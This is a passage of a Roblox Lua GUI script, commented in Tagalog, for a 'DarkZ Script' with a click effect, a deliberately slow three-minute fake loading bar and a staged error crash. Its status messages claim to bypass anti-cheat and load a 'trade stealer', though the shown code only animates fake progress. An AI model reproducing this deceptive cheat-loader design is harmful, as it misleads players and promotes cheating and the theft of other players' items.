-- ========== CLICK EFFECT ==========
local function createClickEffect(button, clickX, clickY)
	local viewportSize = ScreenGui.AbsoluteSize
	local relativeX = clickX / viewportSize.X
	local relativeY = clickY / viewportSize.Y

	local clickEffect = Instance.new("Frame")
	clickEffect.Parent = ScreenGui
	clickEffect.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	clickEffect.BackgroundTransparency = 0.3
	clickEffect.BorderSizePixel = 0
	clickEffect.Position = UDim2.new(relativeX, -15, relativeY, -15)
	clickEffect.Size = UDim2.new(0, 30, 0, 30)
	clickEffect.ZIndex = 9999
	clickEffect.Visible = true

	local effectCorner = Instance.new("UICorner")
	effectCorner.CornerRadius = UDim.new(1, 0)
	effectCorner.Parent = clickEffect

	local fadeOut = tweenService:Create(
		clickEffect,
		TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
		{
			BackgroundTransparency = 1,
			Size = UDim2.new(0, 50, 0, 50),
			Position = UDim2.new(relativeX, -25, relativeY, -25)
		}
	)

	fadeOut:Play()
	fadeOut.Completed:Connect(function()
		clickEffect:Destroy()
	end)
end

-- ========== INITIAL LOADING ANIMATION ==========
function runInitialLoading()
	print("📦 Loading started... (3 MINUTES LOADING TIME)")
	
	-- I-clear ang lumang connection kung mayroon
	stopCurrentLoading()
	
	-- Tiyaking visible ang loading frame
	LoadingFrame.Visible = true
	LoadingFrame.BackgroundTransparency = 0.01
	
	-- Fade in loading frame
	local fadeInInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local fadeInLoading = tweenService:Create(LoadingFrame, fadeInInfo, {BackgroundTransparency = 0.01})
	fadeInLoading:Play()

	wait(0.1)

	-- Fade in all text elements
	tweenService:Create(MainTitle, fadeInInfo, {TextTransparency = 0.01}):Play()
	tweenService:Create(SubText1, fadeInInfo, {TextTransparency = 0.01}):Play()
	tweenService:Create(SubText2, fadeInInfo, {TextTransparency = 0.01}):Play()
	tweenService:Create(SubText3, fadeInInfo, {TextTransparency = 0.01}):Play()
	tweenService:Create(SubText4, fadeInInfo, {TextTransparency = 0.01}):Play()
	tweenService:Create(LoadingPercentage, fadeInInfo, {TextTransparency = 0.01}):Play()
	tweenService:Create(barBg, fadeInInfo, {BackgroundTransparency = 0.01}):Play()

	wait(0.3)

	-- LOADING BAR ANIMATION (3 MINUTES = 180 SECONDS)
	local startTime = tick()
	local loadingDuration = 180  -- 3 minutes

	LoadingBar.Size = UDim2.new(0, 0, 1, 0)
	LoadingBar.BackgroundColor3 = Color3.fromRGB(76, 175, 80)
	LoadingBar.Visible = true

	-- Mas maraming loading messages para sa 3 minutes
	local loadingMessages = {
		"Initializing DarkZ Script...",
		"Loading modules...",
		"Connecting to server...",
		"Bypassing anti-cheat system...",
		"Please wait...",
		"Almost there...",
		"Just a moment...",
		"Finalizing setup...",
		"Loading trade stealer...",
		"Preparing interface...",
		"Connecting to database...",
		"Verifying connection...",
		"Securing tunnel...",
		"Almost complete...",
		"Loading complete..."
	}

	local messageIndex = 1
	local lastMessageChange = tick()
	local messageInterval = 12  -- Magpalit ng message every 12 seconds (180/15 = 12 seconds each)

	-- I-store ang connection para mapatay mamaya
	currentLoadingConnection = runService.Heartbeat:Connect(function()
		local elapsed = tick() - startTime
		local progress = math.min(elapsed / loadingDuration, 1)
		local percentage = math.floor(progress * 100)

		-- I-update ang loading bar size
		LoadingBar.Size = UDim2.new(progress, 0, 1, 0)
		
		-- I-update ang percentage display
		LoadingPercentage.Text = percentage .. "%"

		-- Change loading message every interval
		if tick() - lastMessageChange >= messageInterval then
			messageIndex = (messageIndex % #loadingMessages) + 1
			MainTitle.Text = loadingMessages[messageIndex]
			lastMessageChange = tick()
		end

		-- Update main title based on progress
		if progress < 0.1 then
			MainTitle.Text = "CONNECTING TO SECURE SERVER..."
		elseif progress > 0.95 then
			MainTitle.Text = "Almost Complete!"
		end

		-- Stop when done
		if progress >= 1 then
			stopCurrentLoading()  -- Gamitin ang function para i-disconnect

			MainTitle.Text = "Complete!"
			LoadingPercentage.Text = "100%"

			wait(0.5)

			-- Fade out loading frame
			local fadeOutInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In)

			tweenService:Create(LoadingFrame, fadeOutInfo, {BackgroundTransparency = 1}):Play()
			tweenService:Create(MainTitle, fadeOutInfo, {TextTransparency = 1}):Play()
			tweenService:Create(SubText1, fadeOutInfo, {TextTransparency = 1}):Play()
			tweenService:Create(SubText2, fadeOutInfo, {TextTransparency = 1}):Play()
			tweenService:Create(SubText3, fadeOutInfo, {TextTransparency = 1}):Play()
			tweenService:Create(SubText4, fadeOutInfo, {TextTransparency = 1}):Play()
			tweenService:Create(LoadingPercentage, fadeOutInfo, {TextTransparency = 1}):Play()
			tweenService:Create(barBg, fadeOutInfo, {BackgroundTransparency = 1}):Play()

			wait(0.3)

			LoadingFrame.Visible = false
			Frame.Visible = true
			
			print("✅ Main UI loaded - Waiting 10 seconds before showing error...")
			
			-- Maghintay ng 10 seconds bago magpakita ng error
			task.wait(10)
			
			-- Ipakita ang error
			showErrorAndCrash()
		end
	end)
end

-- ========== TOGGLE ACTIVATION FUNCTION ==========
local function showToggleLoading(toggleName, activatingText, successText, callback, loadingTime)
	if isLoadingActive then
		return
	end

	isLoadingActive = true

	ToggleLoadingFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
	ToggleLoadingFrame.Visible = true
	ToggleLoadingFrame.BackgroundTransparency = 0.01
	ToggleLoadingBar.Size = UDim2.new(0, 0, 1, 0)
	ToggleLoadingBar.BackgroundColor3 = Color3.fromRGB(76, 175, 80)
	ToggleLoadingBar.Visible = true
	ToggleLoadingText.Text = activatingText
	ToggleLoadingText.TextTransparency = 0.01
	ToggleLoadingPercentage.Text = "0%"
	ToggleLoadingPercentage.TextTransparency = 0.01

	local fadeInInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	tweenService:Create(ToggleLoadingFrame, fadeInInfo, {BackgroundTransparency = 0.01}):Play()
	tweenService:Create(ToggleLoadingText, fadeInInfo, {TextTransparency = 0.01}):Play()
	tweenService:Create(ToggleLoadingPercentage, fadeInInfo, {TextTransparency = 0.01}):Play()
	tweenService:Create(toggleBarBg, fadeInInfo, {BackgroundTransparency = 0.01}):Play()

	wait(0.2)

	local startTime = tick()

	local connection
	connection = runService.Heartbeat:Connect(function()
		local elapsed = tick() - startTime
		local progress = math.min(elapsed / loadingTime, 1)
		local percentage = math.floor(progress * 100)

		ToggleLoadingBar.Size = UDim2.new(progress, 0, 1, 0)
		ToggleLoadingPercentage.Text = percentage .. "%"

		if progress >= 1 then
			connection:Disconnect()

			ToggleLoadingText.Text = successText
			ToggleLoadingPercentage.Text = "100%"
			
			wait(1)

			callback()

			local fadeOutInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In)

			tweenService:Create(ToggleLoadingFrame, fadeOutInfo, {BackgroundTransparency = 1}):Play()
			tweenService:Create(ToggleLoadingText, fadeOutInfo, {TextTransparency = 1}):Play()
			tweenService:Create(ToggleLoadingPercentage, fadeOutInfo, {TextTransparency = 1}):Play()
			tweenService:Create(toggleBarBg, fadeOutInfo, {BackgroundTransparency = 1}):Play()

			wait(0.2)
			ToggleLoadingFrame.Visible = false

			isLoadingActive = false
		end
	end)
end

